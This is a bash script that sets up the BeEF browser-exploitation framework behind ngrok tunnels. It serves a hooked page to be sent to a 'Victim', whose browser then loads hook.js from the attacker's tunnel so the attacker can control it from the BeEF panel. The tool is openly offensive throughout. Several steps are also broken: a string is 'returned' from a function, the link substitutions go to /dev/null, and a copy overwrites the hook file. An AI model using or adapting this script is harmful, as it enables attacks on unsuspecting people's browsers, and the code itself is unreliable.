#!/bin/bash

instruction() {
    echo "Instructions :
You need two Links  which are Forwarded To LocalHost:80 and LocalHost:3000
1. To send to Victim .
2. Beef listens on Port 3000, so this link should be forwared to LocalHost:3000 .
	
Just Enter your links in the Script Script will do neccessary changes required to opt for your Links."
}

ngrok() {
    echo "NGROK Steps :

STEP 1 : Add these Lines To ngrok.yml [Location .ngrok2/ngrok.yml ]
	
	tunnels:
  	first-app:
    	addr: 80
    	proto: http
  	second-app:
    	addr: 3000
    	proto: http
	
STEP 2 : Now Start ngrok with : 
		ngrok start --all

STEP 3 : You will See 2 different links Forwarded to 
	Localhost:80              [ Link To be Sent to Victim ]
        Localhost:3000		  [ Your Link will be Connecting to.. ] 	
						
STEP 4 : Enter these links in Script and Follow The Steps given in Script."

}

banner() {
    return "
 |  _ \          |  ____| \ \        / /\   | \ | |  /   \ 
 | |_) | ___  ___| |__     \ \  /\  / /  \  |  \| | |_/\  |
 |  _ < / _ \/ _ \  __|     \ \/  \/ / /\ \ |     |    / /
 | |_) |  __/  __/ |         \  /\  / ____ \| |\  |   / /___
 |____/ \___|\___|_|          \/  \/_/    \_\_| \_|  /______|"
}

init() {
    if [ "$EUID" -ne 0 ]; then
        echo "Please run as root"
        exit
    fi
}

main() {
    init

    clear

    instruction

    echo "[*] IF you want to Do this Without Port Forwarding : Use NGROK"

    ngrok

    sleep 10
    clear

    echo "Checking Services Status Required"

    service apache2 start
    beef-xss
    clear

    echo "All Good So far ..."
    echo "Close The Browser If Prompted ..."

    banner

    echo "[?] Enter Adress of Link [You are Sending to Victim]:"
    read send_to

    echo "[?] Enter Adress of Link [Your Link will be Connecting to..]:"
    read connect_to

    connect_to_full="http://"$connect_to":80/hook.js"
    connect_to_panel="http://"$connect_to"/ui/panel"
    send_to_full="http://"$send_to"/beef.html"

    echo "${connect_to_full/SKS_1/"temp/hook.js"}" >>/dev/null
    echo ${connect_to/SKS_2/"temp/hook.js"} >>/dev/null
    echo ${send_to/SKS_3/"temp/beef.html"} >>/dev/null

    cp "base.js" "temp/hook.js"
    cp "beef.html" "temp/hook.js"

    cp "temp/*" "/var/www/html/"

    chmod a+rw "/var/www/html/hook.js"

    echo "==================================== RESULT ===================================="
    echo "[+] Access The BeeF Control Panel Using: "$connect_to_panel
    echo "Username = beef Password = beef"
    echo "[+] Hooked Link To Send to Victim: "$send_to_full
}

main
